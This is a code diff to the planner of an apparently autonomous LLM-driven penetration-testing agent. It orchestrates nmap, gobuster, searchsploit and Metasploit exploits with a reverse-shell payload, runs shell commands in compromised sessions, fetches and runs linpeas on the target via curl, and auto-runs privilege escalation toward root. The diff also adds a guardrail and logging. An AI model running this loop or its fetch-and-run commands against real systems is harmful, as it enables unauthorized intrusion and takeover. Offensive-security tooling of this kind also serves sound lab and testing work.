@@ -7,7 +7,7 @@ auto-advancing phases when completion criteria are met.
 
 Architecture:
     Planner.__init__(state, runner, llm, msf, kb)
-    Planner.run(max_iterations=50) -> str
+    Planner.run(max_iterations=10) -> str
         └─ loop:
             1. Observe  — state.get_context_summary() + PhaseController focus
             2. Think    — llm.next_action(context, phase) → action dict
@@ -25,7 +25,7 @@ Usage (from main.py):
     from kira.planner import Planner
 
     planner = Planner(state=sm, runner=runner, llm=llm, msf=None, kb=kb)
-    reason  = planner.run(max_iterations=50)
+    reason  = planner.run(max_iterations=10)
     print(f"Session ended: {reason}")
 """
 
@@ -59,7 +59,7 @@ class PhaseController:
     """
     Tracks per-phase context focus and completion logic.
     Injected into the LLM prompt alongside the state summary
-    so Gemma 3 4B knows exactly what it should be doing right now.
+    so qwen2.5-coder:14b-instruct-q4_K_M knows exactly what it should be doing right now.
     """
 
     PHASE_FOCUS = {
@@ -152,6 +152,8 @@ class Planner:
         msf=None,
         kb=None,
         verbose: bool = True,
+        logger=None,
+        guard=None,
     ):
         self._state   = state
         self._runner  = runner
@@ -159,14 +161,17 @@ class Planner:
         self._msf     = msf
         self._kb      = kb
         self._verbose = verbose
+        self._logger  = logger
+        self._guard   = guard
         self._phase_ctrl = PhaseController(state)
+        self._privesc_engine = None
 
         # Anti-loop tracking
         self._action_history: list[str] = []   # recent "tool:args_hash" strings
 
     # ── Public: run ────────────────────────────────────────────────────────────
 
-    def run(self, max_iterations: int = 50) -> str:
+    def run(self, max_iterations: int = 10) -> str:
         """
         Execute the agent loop until a terminal condition is reached.
 
@@ -231,11 +236,27 @@ class Planner:
             # ── 5. Dispatch → execute ──────────────────────────────────────
             result_summary = self._dispatch(action)
 
+            # Day 5: structured action logging
+            if self._logger:
+                self._logger.action(
+                    tool=tool,
+                    args=args,
+                    result={
+                        "ok": not result_summary.startswith(("BLOCKED", "FAILED", "error", "Error")),
+                        "summary": result_summary,
+                    },
+                    elapsed_s=0.0,
+                )
+
             # ── 6. Update state ────────────────────────────────────────────
             self._state.log_action(tool, args, result_summary)
             self._sync_kb_to_state()
 
             self._print_result(result_summary)
+
+            # Day 5: run PrivescEngine once on first POST_EXPLOIT entry.
+            if self._state.phase == "POST_EXPLOIT" and self._privesc_engine is None:
+                self._run_privesc_engine()
 
             # ── 7. Root check ──────────────────────────────────────────────
             if self._state.is_root:
@@ -270,6 +291,16 @@ class Planner:
         Always returns a result_summary string — never raises.
         Handles all 14 tool names from VALID_TOOLS.
         """
+        # Day 5: guardrail check before every action.
+        if self._guard is not None:
+            allowed, block_reason = self._guard.check_action(action)
+            if not allowed:
+                self._state.log_error(action.get("tool", "unknown"), block_reason)
+                if self._logger:
+                    self._logger.error("guardrail", block_reason)
+                self._print_warn(f"GUARDRAIL: {block_reason[:120]}")
+                return f"BLOCKED by guardrail: {block_reason[:120]}"
+
         tool = action.get("tool", "")
         args = action.get("args", {})
         target = self._state.target or ""
@@ -332,7 +363,8 @@ class Planner:
     def _do_nmap(self, args: dict, target: str) -> str:
         tgt   = args.get("target", target)
         flags = args.get("flags", "-sV -sC")
-        ports = args.get("ports")
+        # Enforce all-port scan when model omits ports.
+        ports = _normalize_ports_arg(args.get("ports")) or "-"
 
         result = self._runner.nmap(target=tgt, flags=flags, ports=ports)
 
@@ -350,7 +382,7 @@ class Planner:
                 # Auto-add NSE script findings into KB
                 if self._kb:
                     for f in get_notable_script_findings(parsed):
-                        self._kb.add_dict(f)
+                        self._kb.add_from_dict(f)
 
                 port_count = len(fields.get("open_ports", []))
                 return (
@@ -364,7 +396,7 @@ class Planner:
         return result.summary
 
     def _do_gobuster(self, args: dict) -> str:
-        url      = args.get("url", f"http://{self._state.target}")
+        url      = args.get("url") or _default_http_url(self._state)
         wordlist = args.get(
             "wordlist",
             "/usr/share/wordlists/dirb/common.txt",
@@ -381,7 +413,7 @@ class Planner:
 
                 if self._kb:
                     for f in parsed.get("auto_findings", []):
-                        self._kb.add_dict(f)
+                        self._kb.add_from_dict(f)
 
                 return (
                     f"Found {len(paths)} paths. "
@@ -405,7 +437,7 @@ class Planner:
                 findings = parse_searchsploit_json(result.stdout)
                 if self._kb:
                     for f in findings:
-                        self._kb.add_dict(f)
+                        self._kb.add_from_dict(f)
                 return (
                     f"searchsploit '{query}': {len(findings)} results. "
                     + (
@@ -425,7 +457,7 @@ class Planner:
         return result.summary
 
     def _do_curl(self, args: dict) -> str:
-        url   = args.get("url", f"http://{self._state.target}")
+        url   = args.get("url") or _default_http_url(self._state)
         flags = args.get("flags", "-sI")
         result = self._runner.curl(url=url, flags=flags)
         if result.ok:
@@ -442,7 +474,7 @@ class Planner:
         return result.summary
 
     def _do_whatweb(self, args: dict) -> str:
-        url    = args.get("url", f"http://{self._state.target}")
+        url    = args.get("url") or _default_http_url(self._state)
         result = self._runner.whatweb(url=url)
         return result.summary
 
@@ -461,21 +493,72 @@ class Planner:
 
         module_path = args.get("module", "")
         options     = args.get("options", {})
+        wait_s      = int(args.get("wait_s", 30))
+        poll_s      = float(args.get("poll_s", 2))
 
         try:
+            if not module_path:
+                return "msf_exploit skipped — missing required 'module' path"
+
+            # Support wrapper-style MSF client (kira/msf_client.py).
+            if hasattr(self._msf, "run_module"):
+                payload_name = args.get("payload")
+                result = self._msf.run_module(module_path, options, payload=payload_name)
+                if result.get("success"):
+                    sid = result.get("session_id")
+                    sessions = list((self._msf.list_sessions() or {}).keys())
+                    if sessions:
+                        self._state.update(
+                            sessions=[{"id": str(s), "type": "meterpreter"} for s in sessions]
+                        )
+                    return f"Exploit succeeded — session_id={sid}"
+                return (
+                    f"Exploit ran but no session opened. "
+                    f"Output: {result.get('output', '')} Error: {result.get('error', '')}"
+                )
+
+            # LLM may provide "exploit/unix/..." while pymetasploit expects
+            # type + path separately. Normalize to bare module path.
+            if module_path.startswith("exploit/"):
+                module_path = module_path[len("exploit/"):]
+
             exploit = self._msf.modules.use("exploit", module_path)
             for k, v in options.items():
                 exploit[k] = v
-            exploit["LHOST"] = options.get("LHOST", "")
 
-            payload = self._msf.modules.use(
-                "payload",
-                args.get("payload", "generic/shell_reverse_tcp"),
-            )
-            result = exploit.execute(payload=payload)
+            # Do not force-clear LHOST. If the module/payload needs it,
+            # the caller must provide a real routable value.
+            if options.get("LHOST"):
+                exploit["LHOST"] = options["LHOST"]
 
-            # Check if a new session appeared
-            sessions = list(self._msf.sessions.list.keys())
+            payload_name = args.get("payload", "generic/shell_reverse_tcp")
+            if payload_name.startswith("payload/"):
+                payload_name = payload_name[len("payload/"):]
+            if payload_name:
+                exploit["PAYLOAD"] = payload_name
+            existing_sessions = set(self._msf.sessions.list.keys())
+            result = exploit.execute()
+
+            # Poll briefly for a new session so async exploit jobs don't look "silent".
+            elapsed = 0.0
+            while elapsed < wait_s:
+                sessions_now = set(self._msf.sessions.list.keys())
+                new_sessions = sorted(sessions_now - existing_sessions)
+                if new_sessions:
+                    sess_list = [
+                        {"id": sid, "type": "meterpreter"}
+                        for sid in sorted(sessions_now)
+                    ]
+                    self._state.update(sessions=sess_list)
+                    return (
+                        f"Exploit succeeded — new session(s): {new_sessions}. "
+                        f"All active sessions: {sorted(sessions_now)}"
+                    )
+                time.sleep(max(poll_s, 0.5))
+                elapsed += max(poll_s, 0.5)
+
+            # No new session appeared in wait window.
+            sessions = sorted(self._msf.sessions.list.keys())
             if sessions:
                 sess_list = [
                     {"id": sid, "type": "meterpreter"}
@@ -483,11 +566,14 @@ class Planner:
                 ]
                 self._state.update(sessions=sess_list)
                 return (
-                    f"Exploit succeeded — {len(sessions)} session(s) opened: "
-                    f"{sessions}"
+                    f"Exploit finished with existing session(s): {sessions}. "
+                    "No new session detected in wait window."
                 )
 
-            return f"Exploit ran but no session opened. Result: {result}"
+            return (
+                f"Exploit ran but no session opened after {wait_s}s wait. "
+                f"Result: {result}"
+            )
 
         except Exception as e:
             self._state.log_error("msf_exploit", str(e))
@@ -502,9 +588,24 @@ class Planner:
             return "shell_cmd: Metasploit RPC not connected."
 
         try:
-            session = self._msf.sessions.session(str(session_id))
-            result  = session.run_with_output(cmd, timeout=30)
-            output  = result.strip()
+            # Support wrapper-style MSF client (kira/msf_client.py).
+            if hasattr(self._msf, "shell_cmd"):
+                output = self._msf.shell_cmd(session_id=session_id, cmd=cmd, timeout=30).strip()
+                if not output:
+                    return f"shell_cmd '{cmd}': (no output)"
+            else:
+                session = self._msf.sessions.session(str(session_id))
+                session_type = self._msf.sessions.list.get(
+                    str(session_id), {}
+                ).get("type", "shell")
+
+                if session_type == "meterpreter":
+                    result = session.run_with_output(cmd, timeout=30)
+                else:
+                    session.write(cmd + "\n")
+                    time.sleep(2)
+                    result = session.read()
+                output = result.strip()
 
             # Auto-detect root escalation
             if "uid=0" in output or "root" in output.lower():
@@ -535,21 +636,31 @@ class Planner:
             return "linpeas: Metasploit RPC not connected."
 
         try:
-            session = self._msf.sessions.session(str(session_id))
-
-            # Download linpeas if not already on target
-            dl_cmd = (
-                "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest"
-                "/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"
-            )
-            session.run_with_output(dl_cmd, timeout=30)
-            output = session.run_with_output("/tmp/linpeas.sh 2>/dev/null", timeout=120)
+            if hasattr(self._msf, "shell_cmd"):
+                dl_cmd = (
+                    "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest"
+                    "/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"
+                )
+                self._msf.shell_cmd(session_id=session_id, cmd=dl_cmd, timeout=30)
+                output = self._msf.shell_cmd(
+                    session_id=session_id,
+                    cmd="/tmp/linpeas.sh 2>/dev/null",
+                    timeout=120,
+                )
+            else:
+                session = self._msf.sessions.session(str(session_id))
+                dl_cmd = (
+                    "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest"
+                    "/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"
+                )
+                session.run_with_output(dl_cmd, timeout=30)
+                output = session.run_with_output("/tmp/linpeas.sh 2>/dev/null", timeout=120)
 
             # Surface a few key vectors as findings
             findings = _parse_linpeas_output(output)
             if self._kb:
                 for f in findings:
-                    self._kb.add_dict(f)
+                    self._kb.add_from_dict(f)
 
             lines = [l for l in output.splitlines() if l.strip()]
             return (
@@ -560,6 +671,50 @@ class Planner:
         except Exception as e:
             self._state.log_error("linpeas", str(e))
             return f"linpeas error: {e}"
+
+    def _run_privesc_engine(self) -> None:
+        """
+        Auto-run PrivescEngine once when POST_EXPLOIT starts.
+        """
+        try:
+            from kira.privesc import PrivescEngine
+            self._privesc_engine = PrivescEngine()
+
+            shell_history = self._state.get("shell_history") or []
+            linpeas_output = ""
+            for entry in reversed(shell_history):
+                cmd = entry.get("cmd", "")
+                if "linpeas" in cmd or "linpeas.sh" in cmd:
+                    linpeas_output = entry.get("output", "")
+                    break
+
+            if not linpeas_output:
+                self._print_info("PrivescEngine: no linpeas output in history yet")
+                return
+
+            vectors = self._privesc_engine.analyse(linpeas_output, self._state)
+            self._print_info(f"PrivescEngine: {len(vectors)} escalation vector(s) detected")
+
+            if self._logger:
+                for v in vectors:
+                    self._logger.finding(v.to_finding_dict())
+
+            if vectors:
+                next_cmd = self._privesc_engine.suggest_next_cmd(
+                    vectors,
+                    [e.get("cmd", "") for e in shell_history],
+                )
+                if next_cmd:
+                    self._state.add_note(
+                        f"PrivescEngine suggests: {next_cmd} "
+                        f"(technique: {vectors[0].technique}, "
+                        f"confidence: {vectors[0].confidence:.0%})"
+                    )
+
+        except ImportError:
+            self._print_warn("privesc.py not found — skipping PrivescEngine")
+        except Exception as e:
+            self._print_warn(f"PrivescEngine error: {e}")
 
     def _do_add_finding(self, args: dict) -> str:
         """LLM manually registers a finding it observed."""
@@ -581,7 +736,7 @@ class Planner:
         }
 
         if self._kb:
-            self._kb.add_dict(finding)
+            self._kb.add_from_dict(finding)
         else:
             self._state.add_finding(finding)
 
@@ -597,6 +752,8 @@ class Planner:
     def _do_advance_phase(self) -> str:
         old = self._state.phase
         new = self._state.advance_phase()
+        if self._logger and new != old:
+            self._logger.phase(old, new)
         return f"Phase advanced: {old} → {new}"
 
     # ── Phase gate ─────────────────────────────────────────────────────────────
@@ -803,6 +960,50 @@ def _url_to_port(url: str) -> Optional[int]:
         return 443 if parsed.scheme == "https" else 80
     except Exception:
         return None
+
+
+def _normalize_ports_arg(ports: Optional[str]) -> Optional[str]:
+    """
+    Normalize LLM-provided ports argument.
+    Accepts values like "-p 80,443" and converts to "80,443".
+    """
+    if not ports:
+        return None
+    p = str(ports).strip()
+    if p.startswith("-p "):
+        return p[3:].strip()
+    if p.startswith("-p"):
+        return p[2:].strip()
+    return p
+
+
+def _default_http_url(state) -> str:
+    """
+    Build a sensible default URL from known open ports/services.
+    Falls back to http://<target>.
+    """
+    target = state.target or "127.0.0.1"
+    open_ports = list(state.get("open_ports") or [])
+
+    # Prefer standard web ports first.
+    for p in (80, 443, 8080, 8443, 8000, 8888, 55553):
+        if p in open_ports:
+            scheme = "https" if p == 443 else "http"
+            return f"{scheme}://{target}" if p in (80, 443) else f"{scheme}://{target}:{p}"
+
+    # Try to infer from service names.
+    services = dict(state.get("services") or {})
+    for p_str, svc in services.items():
+        svc_l = str(svc).lower()
+        if "http" in svc_l or "web" in svc_l:
+            try:
+                p = int(p_str)
+            except Exception:
+                continue
+            scheme = "https" if p == 443 else "http"
+            return f"{scheme}://{target}" if p in (80, 443) else f"{scheme}://{target}:{p}"
+
+    return f"http://{target}"
 
 
 # ── Smoke test ─────────────────────────────────────────────────────────────────
